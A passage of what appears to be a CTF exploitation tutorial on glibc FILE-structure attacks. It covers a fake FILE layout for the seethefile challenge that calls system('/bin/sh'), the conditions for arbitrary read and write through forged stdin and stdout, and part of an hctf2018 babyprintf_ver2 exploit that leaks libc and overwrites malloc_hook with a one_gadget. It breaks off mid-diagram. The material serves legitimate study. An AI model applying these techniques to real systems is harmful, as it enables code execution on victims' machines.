"/bin/sh"</span></span><br><span class="line"> →   <span class="number">56</span>    _IO_acquire_lock (fp);</span><br><span class="line">     <span class="number">57</span>    <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">     <span class="number">58</span>      status = _IO_file_close_it (fp);</span><br><span class="line">     <span class="number">59</span>    <span class="keyword">else</span></span><br><span class="line">     <span class="number">60</span>      status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">     <span class="number">61</span>    _IO_release_lock (fp);</span><br><span class="line">─────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#<span class="number">0</span>] Id <span class="number">1</span>, Name: <span class="string">"seethefile"</span>, stopped, reason: SINGLE STEP</span><br><span class="line">───────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#<span class="number">0</span>] <span class="number">0xf75d05f8</span> → _IO_new_fclose(fp=<span class="number">0x804b260</span> &lt;name&gt;)</span><br><span class="line">[#<span class="number">1</span>] <span class="number">0x8048b14</span> → main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>I found that when step into function <code>_IO_acquire_lock()</code>, the  function needs to get the value of <code>[esi+0x48]</code>. Therefore, we should make <code>esi+0x48</code> an accessible address.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">        +-----------------+&lt;--+ 0x0</span><br><span class="line">    +--&gt;|     &#x2F;bin&#x2F;sh     |  (name)</span><br><span class="line">    |   +-----------------+</span><br><span class="line">    |   |                 |</span><br><span class="line">    |   |       ...       |</span><br><span class="line">+------&gt;|                 |</span><br><span class="line">|   |   +-----------------+&lt;--+ 0x20</span><br><span class="line">|   +--+|    0x804b260    |  (fp)</span><br><span class="line">|       +-----------------+</span><br><span class="line">|       |                 |</span><br><span class="line">|       |       ...       |</span><br><span class="line">|       |                 |</span><br><span class="line">|       +-----------------+&lt;--+ 0x40</span><br><span class="line">|   +--&gt;|     __dummy     |</span><br><span class="line">|   |   |-----------------|</span><br><span class="line">|   |   |     __dummy2    |</span><br><span class="line">|   |   +-----------------+&lt;--+ 0x48</span><br><span class="line">+---|--+|    0x804b278    |</span><br><span class="line">    |   +-----------------+</span><br><span class="line">    |   |                 |</span><br><span class="line">    |   |                 |</span><br><span class="line">    |   |                 |</span><br><span class="line">    |   |       ...       |</span><br><span class="line">    |   |                 |</span><br><span class="line">    |   |                 |</span><br><span class="line">    |   |                 |</span><br><span class="line">    |   |                 |</span><br><span class="line">    |   +-----------------+&lt;--+ 0x84</span><br><span class="line">    |   |   system_addr   |  (__close)</span><br><span class="line">    |   +-----------------+</span><br><span class="line">    |   |                 |</span><br><span class="line">    |   |       ...       |</span><br><span class="line">    |   |                 |</span><br><span class="line">    |   |                 |</span><br><span class="line">    |   +-----------------+&lt;--+ 0x94</span><br><span class="line">    +--+|    0x804b2a0    |  (vtable)</span><br><span class="line">        +-----------------+</span><br></pre></td></tr></table></figure></li></ul><h2 id="Arbitrary-reading-and-writing"><a href="#Arbitrary-reading-and-writing" class="headerlink" title="Arbitrary reading and writing"></a>Arbitrary reading and writing</h2><p>This section mainly explains  how to use stdin to implement arbitrary address writing and stdout to implement arbitrary address reading and writing.</p><h3 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h3><h4 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h4><p>Using <code>fread</code> to explain how to implement arbitrary address writing.  The workflow of <code>fread</code> is shown as below:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------------+</span><br><span class="line">|                                |</span><br><span class="line">|            fread               |</span><br><span class="line">|                                |</span><br><span class="line">+---------------+----------------+</span><br><span class="line">                |</span><br><span class="line">                v</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                                |</span><br><span class="line">|      table-&gt;_IO_filexsgetn     |</span><br><span class="line">|                                |</span><br><span class="line">+--------+------------------+----+</span><br><span class="line">         |                  |</span><br><span class="line">         |                  |</span><br><span class="line">         |                  v</span><br><span class="line">         |         +--------------------------------+</span><br><span class="line">         |         |                                |</span><br><span class="line">         |         |       vtable-&gt;_IO_doallocbuf   |</span><br><span class="line">         |         |                                |</span><br><span class="line">         |         +--------------------------------+</span><br><span class="line">         |</span><br><span class="line">         v</span><br><span class="line">+---------------------------------+</span><br><span class="line">|                                 |</span><br><span class="line">|  vtable-&gt;_IO_new_file_underflow |</span><br><span class="line">|                                 |</span><br><span class="line">+----------------+----------------+</span><br><span class="line">                 |</span><br><span class="line">                 v</span><br><span class="line">+---------------------------------+</span><br><span class="line">|                                 |</span><br><span class="line">|            sys_read             |</span><br><span class="line">|                                 |</span><br><span class="line">+---------------------------------+</span><br></pre></td></tr></table></figure><p>The core of <code>fread</code> is function <code>_IO_file_xsgetn</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">...</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>First, <code>_IO_file_xsgetn</code> will check whether the <code>io buffer</code> is empty. If empty, it will call function <code>_IO_doallocbuf</code> to allocate a buffer.</p></li><li><p>If the read buffer has available space, it will read data to the read buffer.</p></li><li><p>When the read buffer is full, it will call function <code>_IO_new_file_underflow</code> to copy data to the destination.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">...</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">...</span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (_IO_stdout, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (_IO_stdout);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>So, f we can control the pointer of the read buffer, can we achieve arbitrary address writing. To achieve this, <strong>the file should satisfy the following condition:</strong></p><ul><li><code>_IO_read_end == _IO_read_ptr</code></li><li><code>_IO_buf_base != NULL</code></li><li><code>_flags &amp; _IO_NO_READS != 0</code>  =&gt;  <code>_flags &amp;= ~4</code></li><li><code>_fileno == 0</code></li><li><code>_IO_buf_base = dest</code> and <code>_IO_buf_end - IO_buf_base &gt; length</code></li></ul><h4 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h4><p>This is the workflow of <code>fwrite</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">+--------------------------------+</span><br><span class="line">|                                |</span><br><span class="line">|            fwrite              |</span><br><span class="line">|                                |</span><br><span class="line">+---------------+----------------+</span><br><span class="line">                |</span><br><span class="line">                v</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                                |</span><br><span class="line">|     vtable-&gt;_IO_filexsputn     |</span><br><span class="line">|                                |</span><br><span class="line">+---------------+----------------+</span><br><span class="line">                |</span><br><span class="line">                v</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                                |</span><br><span class="line">|  vtable-&gt;_IO_new_file_overflow |</span><br><span class="line">|                                |</span><br><span class="line">+--------+------------------+----+</span><br><span class="line">         |                  |</span><br><span class="line">         |                  v</span><br><span class="line">         |         +--------------------------------+</span><br><span class="line">         |         |                                |</span><br><span class="line">         |         |       vtable-&gt;doallocate       |</span><br><span class="line">         |         |                                |</span><br><span class="line">         |         +--------------------------------+</span><br><span class="line">         v</span><br><span class="line">+---------------------------------+</span><br><span class="line">|                                 |</span><br><span class="line">|            sys_write            |</span><br><span class="line">|                                 |</span><br><span class="line">+---------------------------------+</span><br></pre></td></tr></table></figure><p>Lets look the source code of <code>_IO_new_file_xsputn</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">...</span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>From the source code, we can know that we can control <code>_IO_write_ptr</code> and <code>_IO_write_end</code> to accomplish arbitrary address writing.</p><p>Continue to follow up to the function <code>_IO_new_file_overflow</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>At the beginning of <code>_IO_new_file_overflow</code>, the function check the <code>_flags</code> whether satisfy <code>_IO_NO_WRITES</code>. If meet, the function will return. And if the stream buffer is empty, will the function call <code>_IO_doallocbuf</code>. </p><p>Another thing that we need to be attention is that if the file satisfy <code>(f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</code>, the <code>_IO_write_end</code> will be change.</p><p>Follow the function <code>_IO_do_write</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line"></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Be ware that if <code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>, the function will return 0. </p><p>At last,  <code>_IO_SYSWRITE</code> will use system call <code>read</code> to print the data.</p><p>So, if we want to implement arbitrary address reading, we need forge the file to satisfy these conditions :</p><ul><li><code>f-&gt;_IO_write_end == f-&gt;_IO_write_ptr</code></li><li><code>_flag &amp;= ~_IO_NO_WRITES</code> =&gt; <code>_flag &amp;= ~0x8</code>。</li><li><code>_flag &amp;= _IO_CURRENTLY_PUTTING</code> =&gt; <code>_flag |= 0x800</code></li><li><code>_fileno</code> == 1。</li><li><code>_IO_write_base = dest</code>；<code>_IO_write_ptr= dest_end</code>。</li><li><code>_IO_read_end = _IO_write_base</code> or  || <code>_flag &amp; _IO_IS_APPENDING</code> =&gt; <code>_flag | 0x1000</code>。</li></ul><h3 id="hctf2018-babyprintf-ver2"><a href="#hctf2018-babyprintf-ver2" class="headerlink" title="hctf2018-babyprintf_ver2"></a>hctf2018-babyprintf_ver2</h3><p>Pseudocode:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"So I change the buffer location to %p\n"</span>, (__int64)aHelloWorld);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Have fun!"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    vtable = *(_QWORD *)&amp;<span class="built_in">stdout</span>[<span class="number">1</span>]._flags;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">      aHelloWorld[i] = buf;</span><br><span class="line">      <span class="keyword">if</span> ( aHelloWorld[i] == <span class="string">'\n'</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++i &gt; <span class="number">511</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">    &#125;</span><br><span class="line">    aHelloWorld[i] = <span class="number">0</span>;</span><br><span class="line">LABEL_6:</span><br><span class="line">    v4 = <span class="built_in">stdout</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;<span class="built_in">stdout</span>[<span class="number">1</span>]._flags != vtable )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"rewrite vtable is not permitted!\n"</span>, <span class="number">0x21</span>uLL);</span><br><span class="line">      *(_QWORD *)&amp;v4[<span class="number">1</span>]._flags = vtable;</span><br><span class="line">    &#125;</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, (__int64)aHelloWorld, <span class="number">0xDEADBEEF</span>LL);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>Our input is stored in the buffer ahelloworld. And there is an overflow vulnerability, which can be used to overwrite the address of stdout. We can forge the stdout to implement arbitrary address reading and writing.</p><ul><li><p>First, we can use the vulnerability to get the address the of <code>puts</code>. Thereby we have the address of libc.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------+</span><br><span class="line">|          0x8800          |&lt;----+ _flags</span><br><span class="line">+------------- ------------+</span><br><span class="line">|                          |</span><br><span class="line">+--------------------------+</span><br><span class="line">|         read_got         |&lt;----+ _IO_read_end</span><br><span class="line">+--------------------------+</span><br><span class="line">|                          |</span><br><span class="line">+--------------------------+</span><br><span class="line">|         read_got         |&lt;----+ _IO_write_base</span><br><span class="line">+--------------------------+</span><br><span class="line">|      read_got + 0x8      |&lt;----+ _IO_write_ptr</span><br><span class="line">+--------------------------+</span><br><span class="line">|      read_got + 0x8      |&lt;----+ _IO_write_end</span><br><span class="line">+--------------------------+</span><br><span class="line">|                          |</span><br><span class="line">|           ...            |</span><br><span class="line">|                          |</span><br><span class="line">+--------------------------+</span><br><span class="line">|            0x1           |&lt;----+ _fileno</span><br><span class="line">+--------------------------+</span><br><span class="line">|                          |</span><br><span class="line">|           ...            |</span><br><span class="line">|                          |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>Then we overwrite the content of  <code>malloc_hook</code> to the address of <code>one_gadget</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------+</span><br><span class="line">|        one_gadget        |&lt;----+ aHelloWorld</span><br><span class="line">+--------------------------+</span><br><span class="line">|                          |</span><br><span class="line">+--------------------------+</span><br><span class="line">|    aHelloWorld + 0x18    |&lt;----+ stdout</span><br><span class="line">+--------------------------+</span><br><span class="line">|          0x8800          |&lt;----+ _flags</span><br><span class="line">+--------------------------+</span><br><span class="line">|                          |</span><br><span class="line">|                          |</span><br><span class="line">|           ...            |</span><br><span 